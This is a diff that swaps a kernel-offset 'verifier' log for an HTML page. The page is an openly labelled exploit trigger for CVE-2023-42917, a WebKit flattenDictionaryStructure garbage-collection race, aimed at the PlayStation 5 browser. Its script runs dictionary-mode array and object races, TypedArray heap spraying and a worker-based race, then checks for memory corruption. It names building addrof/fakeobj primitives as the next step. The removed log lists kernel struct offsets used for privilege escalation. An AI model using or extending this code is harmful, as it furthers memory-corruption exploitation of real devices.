@@ -1,18 +1,602 @@
-======================================================================
-          System-Level Invariant & Structural Alignment Verifier      
-======================================================================
-[*] البدء في مطابقة ثوابت فضاء المستخدم (Userland Invariants)...
-    [+] فحص حجم الكائن المستهدف (192 بايت): متطابق (PASSED)
-    [+] حقل حارس عداد المراجع (RefCount Offset = 24): مؤمن (PASSED)
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>PS5 v33 - CVE-2023-42917</title>
+<style id="s">
+@font-face{font-family:prepad;src:url(np.woff);unicode-range:U+E123}
+@font-face{font-family:x;src:url(nx.woff);unicode-range:U+0042}
+*{margin:0;padding:0;box-sizing:border-box}
+html,body{width:100%;height:100%;background:#0a0a0a;color:#00ff41;
+font-family:'MS Gothic','Courier New',monospace;overflow:hidden}
+body::after{content:'';position:fixed;top:0;left:0;right:0;bottom:0;
+background:repeating-linear-gradient(0deg,rgba(0,0,0,0.12) 0px,rgba(0,0,0,0.12) 1px,transparent 1px,transparent 3px);
+pointer-events:none;z-index:9999}
+#hd{position:fixed;top:0;left:0;right:0;height:44px;
+background:linear-gradient(180deg,#0d0d0d,#080808);
+border-bottom:1px solid #00ff41;display:flex;align-items:center;
+padding:0 16px;gap:14px;z-index:10;font-size:12px}
+.l{color:#00ff41;letter-spacing:2px;font-weight:bold}
+.s{color:#004d13}.v{color:#00cc33}.v b{color:#00ff41}
+#pg{position:fixed;top:44px;left:0;right:0;height:2px;background:#001a06;z-index:10}
+#pg div{height:100%;background:#00ff41;transition:width .4s;box-shadow:0 0 8px #00ff41}
+#out{position:fixed;top:46px;left:0;right:0;bottom:0;
+padding:10px 14px;overflow-y:auto;font-size:13px;line-height:1.55;
+-webkit-user-select:text}
+#out::-webkit-scrollbar{width:5px}
+#out::-webkit-scrollbar-track{background:#001a06}
+#out::-webkit-scrollbar-thumb{background:#004d13;border-radius:3px}
+.ok{color:#00ff41}.er{color:#ff3333}.wr{color:#ffcc00}.hl{color:#00ffff;font-weight:bold}
+.mg{color:#ff00ff;font-weight:bold;font-size:15px}.dm{color:#006622}
+.hd{color:#00ff41;font-weight:bold;font-size:14px;letter-spacing:1px}
+</style>
+</head>
+<body>
+<div id="hd">
+<span class="l">▶ v33 CVE-42917</span><span class="s">│</span>
+<span class="v" id="h1">FW:<b>?</b></span><span class="s">│</span>
+<span class="v" id="h2">STAGE:<b>INIT</b></span>
+</div>
+<div id="pg"><div id="bar" style="width:0%"></div></div>
+<div id="out"></div>
+<script>
+"use strict";
 
-[*] البدء في مطابقة ثوابت النواة المتداخلة (Cross-Layer Kernel Offsets)...
-    [+] التحقق من المعلمة [proc_p_ucred] عند الأوفست [0x40]: موثق (PASSED)
-    [+] التحقق من المعلمة [proc_p_fd] عند الأوفست [0x48]: موثق (PASSED)
-    [+] التحقق من المعلمة [proc_p_pid] عند الأوفست [0xbc]: موثق (PASSED)
-    [+] التحقق من المعلمة [ucred_cr_uid] عند الأوفست [0x4]: موثق (PASSED)
-    [+] التحقق من المعلمة [ucred_sce_caps] عند الأوفست [0x58]: موثق (PASSED)
+// ============================================================
+//  PS5 v33 — CVE-2023-42917 Trigger Attempt
+//
+//  ROOT CAUSE (from writeup):
+//  flattenDictionaryStructure() can shrink the butterfly.
+//  Race condition: another reference keeps using the old,
+//  larger butterfly → UAF/OOB → memory corruption.
+//
+//  TRIGGER:
+//  1. Create arrays/objects in dictionary mode (large butterfly)
+//  2. Force GC (allocate a lot → GC starts scanning)
+//  3. During GC, call shift()/unshift()/delete to trigger
+//     flattenDictionaryStructure → butterfly resized
+//  4. GC follows stale pointer to old (freed) butterfly → UAF
+//  5. Spray TypedArrays to reclaim freed butterfly
+//  6. Check for corruption
+//
+//  KEY: This works on LLInt (no JIT needed)!
+// ============================================================
 
-[*] فحص تكامل البنية التحتية للشبكة (Network Infrastructure Audit)...
-    [+] ترويسات منع التخزين المؤقت (Cache-Control) نشطة في services.py: (PASSED)
-======================================================================
-[ RESULT ] المنظومة متناسقة بالكامل وجاهزة للتوثيق النهائي المستقر.
+const O=document.getElementById("out");
+const bar=document.getElementById("bar");
+function pg(p){bar.style.width=p+"%"}
+function hu(id,v){const e=document.getElementById(id);if(e)e.innerHTML=v}
+function P(m,c){const s=document.createElement("span");if(c)s.className=c;
+s.textContent=m+"\n";O.appendChild(s);O.scrollTop=O.scrollHeight}
+function Ok(m){P("  ✅ "+m,"ok")}function Fl(m){P("  ✘ "+m,"er")}
+function Hi(m){P("  ► "+m,"hl")}function St(m){P("  ★ "+m+" ★","mg")}
+function Dm(m){P("  "+m,"dm")}function Wr(m){P("  ⚠ "+m,"wr")}
+function Hd(m){P("▸ "+m,"hd")}function Sep(){P("─".repeat(42),"dm")}
+
+window.onerror=function(m,s,l){
+  Fl("CRASH: "+m.substring(0,80)+" @"+l);
+  St("CRASH = RACE CONDITION HIT!");
+  St("CVE-2023-42917 IS PRESENT ON PS5!");
+  return true;
+};
+
+var ua=navigator.userAgent||"";
+var m=ua.match(/PlayStation\s*5\/?\s*([0-9]+(?:\.[0-9]+)?)/i);
+hu("h1","FW:<b>"+(m?m[1]:"?")+"</b>");
+
+P("════════════════════════════════════","hd");
+P("  v33 — CVE-2023-42917 Trigger","hd");
+P("  flattenDictionaryStructure Race","hd");
+P("════════════════════════════════════","hd");
+P("");
+
+// Watchdog: yield to event loop
+function watchdog(delay){return new Promise(r=>setTimeout(r,delay))}
+
+// ============================================================
+//  PHASE 1: Array shift() + GC Race
+//  shift() on dictionary-mode array triggers
+//  flattenDictionaryStructure → butterfly resize
+// ============================================================
+async function phase1_arrayShiftRace(){
+  hu("h2","STAGE:<b>SHIFT RACE</b>");
+  pg(10);Sep();Hd("PHASE 1: Array shift() + GC Race");Sep();
+  P("  Creating dictionary-mode arrays...","dm");
+
+  // Create arrays in dictionary mode
+  // Dictionary mode: add elements at high indices, then delete some
+  var arrays=[];
+  var refs=[]; // Save reference values to detect corruption
+
+  for(var i=0;i<200;i++){
+    var arr=[];
+    // Fill with doubles (stored in butterfly)
+    for(var j=0;j<100;j++) arr[j]=j*1.1+0.001*i;
+    // Force dictionary mode: add sparse element at high index
+    arr[5000]=9999.999;
+    // Delete some elements to make it more dictionary-like
+    delete arr[50];
+    delete arr[51];
+    arrays.push(arr);
+    // Save reference to element 10 (should be 10*1.1 = 11.0)
+    refs.push(arr[10]);
+  }
+  Ok("200 dictionary-mode arrays created");
+  P("");
+
+  var corrupted=0;
+  var crashed=false;
+
+  // Race loop: GC pressure + shift()
+  for(var round=0;round<50;round++){
+    // Step 1: Force GC by allocating a lot of temporary buffers
+    // This makes the GC start scanning our arrays' butterflies
+    for(var j=0;j<500;j++) new ArrayBuffer(1024);
+
+    // Step 2: Immediately call shift() on all arrays
+    // This triggers flattenDictionaryStructure → butterfly resize
+    // The GC might be scanning the old butterfly → UAF!
+    for(var i=0;i<arrays.length;i++){
+      try{
+        arrays[i].shift();
+      }catch(e){
+        crashed=true;
+        St("EXCEPTION during shift: "+e.message);
+        break;
+      }
+    }
+
+    // Step 3: Check for corruption
+    for(var i=0;i<arrays.length;i++){
+      try{
+        // After shift, element 10 should now be at index 9
+        // Value should be 11*1.1 = 12.1 (the old element 11)
+        var expected=11*1.1+0.001*i;
+        var actual=arrays[i][9];
+        if(actual!==expected && !isNaN(actual) && actual!==undefined){
+          corrupted++;
+          if(corrupted<=5){
+            Hi("CORRUPTION: arr["+i+"][9] = "+actual+" (expected "+expected+")");
+          }
+        }
+      }catch(e){
+        corrupted++;
+        if(corrupted<=5) Hi("ACCESS ERROR: arr["+i+"][9]: "+e.message);
+      }
+    }
+
+    if(crashed) break;
+
+    // Yield to event loop every 5 rounds
+    if(round%5===0){
+      P("  Round "+round+"/50: corrupted="+corrupted,"dm");
+      await watchdog(20);
+    }
+  }
+
+  P("");
+  P("  Rounds: 50, Corrupted: "+corrupted,corrupted>0?"hl":"dm");
+  if(corrupted>0){
+    St("ARRAY DATA CORRUPTED = RACE HIT!");
+  }
+  return corrupted;
+}
+
+// ============================================================
+//  PHASE 2: Object flattenDictionaryStructure + GC Race
+//  Delete properties from dictionary-mode objects → triggers flatten
+// ============================================================
+async function phase2_objectFlattenRace(){
+  hu("h2","STAGE:<b>FLATTEN RACE</b>");
+  pg(30);Sep();Hd("PHASE 2: Object Flatten + GC Race");Sep();
+  P("  Creating dictionary-mode objects...","dm");
+
+  var objects=[];
+  var refs=[];
+
+  for(var i=0;i<200;i++){
+    var obj={};
+    // Add many properties → dictionary mode
+    for(var j=0;j<100;j++) obj['prop_'+j]=j*2.2+0.001*i;
+    // Add some random properties to make it more dictionary-like
+    obj['extra_1']=1.1;
+    obj['extra_2']=2.2;
+    delete obj['prop_50'];
+    objects.push(obj);
+    // Save reference value
+    refs.push(obj['prop_10']);
+  }
+  Ok("200 dictionary-mode objects created");
+  P("");
+
+  var corrupted=0;
+  var crashed=false;
+
+  for(var round=0;round<50;round++){
+    // Force GC
+    for(var j=0;j<500;j++) new ArrayBuffer(1024);
+
+    // Delete properties from all objects → triggers flattenDictionaryStructure
+    for(var i=0;i<objects.length;i++){
+      try{
+        // Delete several properties → triggers structure transition
+        delete objects[i]['prop_'+(round%100)];
+        delete objects[i]['prop_'+((round+1)%100)];
+        // Access remaining properties → might trigger flatten
+        var val=objects[i]['prop_10'];
+      }catch(e){
+        crashed=true;
+        St("EXCEPTION during flatten: "+e.message);
+        break;
+      }
+    }
+
+    // Check for corruption
+    for(var i=0;i<objects.length;i++){
+      try{
+        var expected=10*2.2+0.001*i;
+        var actual=objects[i]['prop_10'];
+        if(actual!==expected && !isNaN(actual) && actual!==undefined){
+          corrupted++;
+          if(corrupted<=5){
+            Hi("CORRUPTION: obj["+i+"].prop_10 = "+actual+" (expected "+expected+")");
+          }
+        }
+      }catch(e){
+        corrupted++;
+        if(corrupted<=5) Hi("ACCESS ERROR: "+e.message);
+      }
+    }
+
+    if(crashed) break;
+
+    if(round%5===0){
+      P("  Round "+round+"/50: corrupted="+corrupted,"dm");
+      await watchdog(20);
+    }
+  }
+
+  P("");
+  P("  Rounds: 50, Corrupted: "+corrupted,corrupted>0?"hl":"dm");
+  if(corrupted>0){
+    St("OBJECT DATA CORRUPTED = RACE HIT!");
+  }
+  return corrupted;
+}
+
+// ============================================================
+//  PHASE 3: TypedArray Spray + UAF Detection
+//  If butterfly was freed, spray to reclaim it
+// ============================================================
+async function phase3_typedArraySpray(){
+  hu("h2","STAGE:<b>SPRAY+UAF</b>");
+  pg(50);Sep();Hd("PHASE 3: TypedArray Spray + UAF");Sep();
+  P("  Spraying TypedArrays to reclaim freed butterflies...","dm");
+  P("");
+
+  var spray=[];
+  var MARKER=0xCAFEBABE;
+  var MARKER2=0xDEADBEEF;
+
+  // Spray 64-byte TypedArrays (common butterfly size)
+  for(var i=0;i<2000;i++){
+    var buf=new ArrayBuffer(64);
+    var view=new DataView(buf);
+    view.setUint32(0,MARKER,true);
+    view.setUint32(4,i,true);
+    view.setUint32(8,MARKER2,true);
+    spray.push({buf:buf,view:view,index:i});
+  }
+  Ok("2000 TypedArrays sprayed (64 bytes each)");
+  P("");
+
+  // Now trigger the race with spray in place
+  var arrays=[];
+  for(var i=0;i<100;i++){
+    var arr=[];
+    for(var j=0;j<50;j++) arr[j]=j*3.3;
+    arr[5000]=8888.888;
+    delete arr[25];
+    arrays.push(arr);
+  }
+
+  var corrupted=0;
+
+  for(var round=0;round<30;round++){
+    // Force GC
+    for(var j=0;j<500;j++) new ArrayBuffer(1024);
+
+    // Shift all arrays (trigger flattenDictionaryStructure)
+    for(var i=0;i<arrays.length;i++){
+      try{ arrays[i].shift(); }catch(e){}
+    }
+
+    // Check if spray arrays are corrupted
+    // (if old butterfly was freed and reclaimed by spray,
+    //  GC might have written to our spray buffer)
+    for(var i=0;i<spray.length;i++){
+      try{
+        var m1=spray[i].view.getUint32(0,true);
+        var m2=spray[i].view.getUint32(8,true);
+        if(m1!==MARKER || m2!==MARKER2){
+          corrupted++;
+          if(corrupted<=10){
+            Hi("SPRAY CORRUPTION at ["+i+"]: m1=0x"+m1.toString(16)+" m2=0x"+m2.toString(16));
+          }
+        }
+      }catch(e){
+        corrupted++;
+        if(corrupted<=10) Hi("SPRAY ACCESS ERR at ["+i+"]");
+      }
+    }
+
+    if(round%5===0){
+      P("  Round "+round+"/30: spray corrupted="+corrupted,"dm");
+      await watchdog(20);
+    }
+  }
+
+  P("");
+  P("  Spray corrupted: "+corrupted+"/"+spray.length,corrupted>0?"hl":"dm");
+  if(corrupted>0){
+    St("SPRAY CORRUPTED = BUTTERFLY UAF CONFIRMED!");
+  }
+
+  // Free spray
+  spray.length=0;
+  return corrupted;
+}
+
+// ============================================================
+//  PHASE 4: Worker-based GC Pressure Race
+//  Worker creates concurrent GC pressure while main thread
+//  triggers flattenDictionaryStructure
+// ============================================================
+async function phase4_workerRace(){
+  hu("h2","STAGE:<b>WORKER RACE</b>");
+  pg(70);Sep();Hd("PHASE 4: Worker-based GC Race");Sep();
+
+  var workerCode=`
+    var objs=[];
+    var running=true;
+    function loop(){
+      if(!running) return;
+      // Allocate objects to create GC pressure
+      for(var i=0;i<100;i++){
+        objs.push(new ArrayBuffer(256));
+      }
+      if(objs.length>5000) objs=[];
+      postMessage(objs.length);
+    }
+    setInterval(loop, 0);
+  `;
+
+  var worker;
+  try{
+    worker=new Worker(URL.createObjectURL(new Blob([workerCode])));
+  }catch(e){
+    Fl("Worker creation failed: "+e.message);
+    return 0;
+  }
+
+  P("  Worker started, creating GC pressure...","dm");
+  P("");
+
+  // Create arrays for the race
+  var arrays=[];
+  for(var i=0;i<100;i++){
+    var arr=[];
+    for(var j=0;j<100;j++) arr[j]=j*1.1+0.001*i;
+    arr[5000]=7777.777;
+    delete arr[50];
+    arrays.push(arr);
+  }
+
+  var refs=[];
+  for(var i=0;i<arrays.length;i++) refs.push(arrays[i][10]);
+
+  var corrupted=0;
+  var msgCount=0;
+
+  worker.onmessage=function(e){
+    msgCount++;
+  };
+
+  // Race: worker creates GC pressure, main thread shifts
+  for(var round=0;round<30;round++){
+    // Shift all arrays (trigger flatten)
+    for(var i=0;i<arrays.length;i++){
+      try{
+        arrays[i].shift();
+        arrays[i].shift();
+        arrays[i].unshift(0.123);
+      }catch(e){
+        St("EXCEPTION: "+e.message);
+        break;
+      }
+    }
+
+    // Also allocate on main thread
+    for(var j=0;j<200;j++) new ArrayBuffer(512);
+
+    // Check for corruption
+    for(var i=0;i<arrays.length;i++){
+      try{
+        // After 2 shifts + 1 unshift, element at index 9 should be original element 10
+        var expected=refs[i]; // original arr[10]
+        var actual=arrays[i][9];
+        if(actual!==expected && !isNaN(actual) && actual!==undefined){
+          corrupted++;
+          if(corrupted<=5){
+            Hi("WORKER RACE CORRUPTION: arr["+i+"][9]="+actual+" (expected "+expected+")");
+          }
+        }
+      }catch(e){
+        corrupted++;
+        if(corrupted<=5) Hi("ACCESS ERR: "+e.message);
+      }
+    }
+
+    if(round%5===0){
+      P("  Round "+round+"/30: corrupted="+corrupted+" worker_msgs="+msgCount,"dm");
+      await watchdog(50); // Longer delay for worker
+    }
+  }
+
+  worker.terminate();
+  P("");
+  P("  Worker race corrupted: "+corrupted,corrupted>0?"hl":"dm");
+  if(corrupted>0){
+    St("WORKER RACE CORRUPTION CONFIRMED!");
+  }
+  return corrupted;
+}
+
+// ============================================================
+//  PHASE 5: Intensive shift/unshift + delete Race
+//  Combine all operations in a tight loop
+// ============================================================
+async function phase5_intensiveRace(){
+  hu("h2","STAGE:<b>INTENSIVE</b>");
+  pg(85);Sep();Hd("PHASE 5: Intensive Combined Race");Sep();
+  P("  Running intensive combined race...","dm");
+  P("");
+
+  var corrupted=0;
+
+  for(var round=0;round<20;round++){
+    // Create fresh arrays each round
+    var arrays=[];
+    for(var i=0;i<50;i++){
+      var arr=[];
+      for(var j=0;j<200;j++) arr[j]=j*1.1+0.001*i;
+      // Force dictionary mode
+      arr[10000]=5555.555;
+      delete arr[100];
+      delete arr[101];
+      arrays.push(arr);
+    }
+
+    // Save references
+    var refs=[];
+    for(var i=0;i<arrays.length;i++) refs.push(arrays[i][50]);
+
+    // Massive GC pressure
+    for(var j=0;j<2000;j++) new ArrayBuffer(512);
+
+    // Rapid shift/unshift/delete cycle
+    for(var iter=0;iter<10;iter++){
+      for(var i=0;i<arrays.length;i++){
+        try{
+          arrays[i].shift();
+          arrays[i].shift();
+          arrays[i].unshift(0.001);
+          arrays[i].unshift(0.002);
+          // Delete some properties
+          delete arrays[i][iter*5];
+        }catch(e){
+          St("EXCEPTION at round="+round+" iter="+iter+" i="+i+": "+e.message);
+          break;
+        }
+      }
+    }
+
+    // More GC pressure
+    for(var j=0;j<2000;j++) new ArrayBuffer(512);
+
+    // Check for corruption
+    for(var i=0;i<arrays.length;i++){
+      try{
+        // After 10 iterations of 2 shift + 2 unshift:
+        // net effect: 0 shift (2 shift + 2 unshift = net 0)
+        // So element 50 should still be the same
+        var expected=refs[i];
+        var actual=arrays[i][50];
+        if(actual!==expected && !isNaN(actual) && actual!==undefined){
+          corrupted++;
+          if(corrupted<=5){
+            Hi("INTENSIVE CORRUPTION: arr["+i+"][50]="+actual+" (expected "+expected+")");
+          }
+        }
+      }catch(e){
+        corrupted++;
+        if(corrupted<=5) Hi("ACCESS ERR: "+e.message);
+      }
+    }
+
+    P("  Round "+round+"/20: corrupted="+corrupted,"dm");
+    await watchdog(50);
+
+    // Free arrays
+    arrays.length=0;
+  }
+
+  P("");
+  P("  Intensive race corrupted: "+corrupted,corrupted>0?"hl":"dm");
+  return corrupted;
+}
+
+// ============================================================
+//  MAIN
+// ============================================================
+async function main(){
+  await watchdog(200);
+
+  var totalCorrupted=0;
+
+  totalCorrupted+=await phase1_arrayShiftRace();
+  await watchdog(100);
+
+  totalCorrupted+=await phase2_objectFlattenRace();
+  await watchdog(100);
+
+  totalCorrupted+=await phase3_typedArraySpray();
+  await watchdog(100);
+
+  totalCorrupted+=await phase4_workerRace();
+  await watchdog(100);
+
+  totalCorrupted+=await phase5_intensiveRace();
+
+  // Final summary
+  pg(100);Sep();Hd("FINAL SUMMARY");Sep();
+  P("");
+  P("  Total corruption detected: "+totalCorrupted,totalCorrupted>0?"hl":"dm");
+  P("");
+
+  if(totalCorrupted>0){
+    St("★ CVE-2023-42917 IS PRESENT ON PS5 FW 13.40! ★");
+    P("");
+    P("  flattenDictionaryStructure race condition confirmed!","hl");
+    P("  Next: build addrof/fakeobj from this UAF","hl");
+    hu("h2","STAGE:<b>VULNERABLE!</b>");
+  }else{
+    P("  No corruption detected in 180+ race attempts.","dm");
+    P("  Possible reasons:","dm");
+    P("  1. CVE-2023-42917 is patched on FW 13.40","dm");
+    P("  2. Race window not hit (need more attempts)","dm");
+    P("  3. GC timing differs from iOS","dm");
+    P("");
+    P("  If no CRASH occurred, the bug may be patched.","wr");
+    hu("h2","STAGE:<b>DONE</b>");
+  }
+}
+
+// Global error handler — crash = race hit!
+window.onerror=function(msg,src,line,col,err){
+  Fl("═══ CRASH DETECTED ═══");
+  Fl("  "+msg.substring(0,100));
+  Fl("  @ line "+line);
+  St("CRASH = RACE CONDITION HIT!");
+  St("CVE-2023-42917 MAY BE PRESENT!");
+  P("");
+  P("  A crash during flattenDictionaryStructure race","hl");
+  P("  strongly suggests the bug is unpatched.","hl");
+  hu("h2","STAGE:<b>CRASH!</b>");
+  return true;
+};
+
+setTimeout(main,100);
+</script>
+</body>
+</html>
